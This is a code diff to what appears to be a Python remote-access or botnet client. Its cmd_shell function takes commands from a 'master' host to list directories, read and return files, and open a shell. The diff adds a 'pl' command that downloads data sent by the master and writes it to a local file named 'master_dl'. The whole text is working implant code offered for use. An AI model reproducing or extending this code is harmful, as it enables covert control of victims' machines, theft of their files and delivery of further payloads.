@@ -74,6 +74,8 @@ def cmd_shell(objSocket, master_hostname, master_port):
 
         cmd = encoded_cmd.decode()
         # remove newline from the end
+        res = ""
+        pl = False
         if cmd[:2] == "ls":
             res = ""
             resp_list = os.listdir()
@@ -88,6 +90,8 @@ def cmd_shell(objSocket, master_hostname, master_port):
             data = fp.read()
             fp.close()
             res = str(data)
+        elif cmd[:2] == "pl":
+            pl = True
 
         elif cmd[:5] == "shell":
             shell_port = int(cmd[5:])
@@ -101,6 +105,13 @@ def cmd_shell(objSocket, master_hostname, master_port):
         except socket.error:
             # error sending data to master
             sys.exit(0)
+        
+        if pl == True:
+            filename = "master_dl"
+            encoded_data = objSocket.recv(64000)
+            data = encoded_data.decode()
+            with open(filename, "w") as fp:
+                fp.write(data)
 
 def bootstrap(master_hostname, master_port):
     try:
